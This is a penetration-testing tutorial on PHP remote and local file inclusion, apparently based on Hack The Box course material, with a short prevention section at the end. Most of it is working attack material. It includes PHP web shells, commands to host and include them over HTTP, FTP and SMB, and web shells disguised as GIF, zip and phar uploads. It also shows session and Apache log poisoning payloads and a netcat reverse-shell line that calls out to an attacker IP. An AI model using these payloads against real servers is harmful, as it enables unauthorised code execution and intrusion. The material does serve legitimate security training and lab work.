# Remote File Inclusion!
## @Author : M3tr1c_r00t
![image](https://user-images.githubusercontent.com/99975622/213495218-dc5119e4-01e0-4b8a-9606-56aa9f5aba45.png)
An RFi occurs when a vulnerable function allows the inclusion of remote URLs.

This allows two main benefits:
- Enumerating local-only ports and web applications (i.e. SSRF)
- Gaining remote code execution by including a malicious script that we host

When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution.

The following are some of the functions that (if vulnerable) would allow RFI:
![image](https://user-images.githubusercontent.com/99975622/213495980-52266241-187f-4eb9-854a-fd3aa670089d.png)

As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. 
However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
- The vulnerable function may not allow including remote URLs
- You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://).
- The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.

### Verify RFI
The  allow_url_include setting to be enabled in the config file...
```
MetricCode@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

A more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. 
At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures.

If the page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.

If the back-end server hosted any other local web applications (e.g. port 8080), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.

Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

### Remote Code Execution with RFI
Creating an malicious script...
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

#### HTTP
 ``` 
MetricCode@htb[/htb]$ sudo python3 -m http.server 1111
Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
```
Running the script;
```
:http://example.com/index.php?language=http://<OUR_IP>:1111/shell.php&cmd=id
```
#### FTP
 We can start a basic FTP server with Python's pyftpdlib, as follows:
 ```
 MetricCode@htb[/htb]$ sudo python -m pyftpdlib -p 21
[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
 ```
 
 Execution...
 ```
 :http://example.com/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
 ```
 By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
 
 ```
 MetricCode@htb[/htb]$ curl 'http://example.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
#### SMB
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows:
```
MetricCode@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Now, we can include our script by using a UNC path (e.g. \\<OUR_IP>\shell.php), and specify the command with (&cmd=whoami) as we did earlier:
```
:http://example.com/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami
```

For smb, we do not need any non-default settings to be enabled.
 However, we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
 
## PHP Malicious Scripts
```
<?php system($_GET['c']); ?>
<?php system($_REQUEST['c']$); ?>

<?php
$os = shell_exec('id');
echo "<pre>$os</pre>";
?>

<?php
$os = shell_exec('nc 10.10.10.10 4444 -e /bin/bash');
?>

// Replace IP & Port

Dangerous PHP Functions that can be abused for RCE
<?php
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```
### File Upload
If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.


![image](https://user-images.githubusercontent.com/99975622/213590985-ec941f58-ecb9-4732-aa34-96fe7af7ee57.png)

File inclusion is usually done through image uplaod forms.

We can create a malicious image file;

```
echo '<?php system($_GET["cmd"]); ?>' > shell.gif
```

For file identity we can add the gif file tag/magic bytes at the start of the file...
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

___Note:__ We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.

After uploading our malicious file...
```
http://example.com/index.php?language=./profile_images/shell.gif&cmd=id
```
__Note:__ To include to our uploaded file, we used ./profile_images/ as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to ../ out of that directory and then use our URL path, as we learned in previous sections

### Zip Upload
This technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.

We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.

To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:
```
MetricCode@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

__Note:__ Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.


After uploading...
```
http://example.com/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload
Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:
```
MetricCode@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id)

```
http://example.com/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
### Log Poisoning
We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

![image](https://user-images.githubusercontent.com/99975622/213595445-65074421-ba16-4f96-ae14-b97f6891f84a.png)

### PHP Session Poisoning
Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.

We can see that the session file contains two values: page, which shows the selected language page, and preference, which shows the selected language. The preference value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the page value is under our control, as we can control it through the ?language= parameter.


If the sessions is changable, we can do a session poisoning...
```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
If the language status changed;
```
http://example.com/index.php?language=<?php system($_GET["cmd"]);?>

Url encoding...
http://example.com/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

with that, we can get rce...
```
http://example.com/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
This is because the injection is temporary...

### Server Log Poisoning
Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.

By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.

We can do this on burp or via curl...
```
MetricCode@htb[/htb]$ curl -s "http://example.com/index.php" -A '<?php system($_GET["cmd"]); ?>'
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (?cmd=id):

```
http://example.com/index.php?language=/var/log/apache2/access.log&cmd=id

```
__Tip:__ The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
- /var/log/sshd.log
- /var/log/mail
- /var/log/vsftpd.log

### Fuzzing for parameters
```
MetricCode@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
We can use this parameters from this list...
```
https://twitter.com/trbughunters/status/1279768631845494787
```
Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests.

We can also fuzz for LFI in different encodings...
```
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
```
##### ffuf 
```
MetricCode@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

### Patching...
#### File Inclusion Prevention...
The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs

. Whenever any of the functions is used, we should ensure that no user input is directly going into them.

#### Preventing Directory Traversal
The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename.
PHP has __basename()__, which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. 
The downside to this method is that if the application needs to enter any directories, it will not be able to do it.

#### __sanitizing user input...__
```
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```
#### Web Server Configurations...
Turning allow_url_fopen and allow_url_include to Off.
Mod_user and Expect modules should be disabled.
Locking the web_root directory to www...
```
In PHP that can be done by adding open_basedir = /var/www in the php.ini file
```

#### WAF(Web Application Firewall)
Eg. Web Security...
 When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. 
 
 To disable specific php functions...
 ```
 https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/
 ```
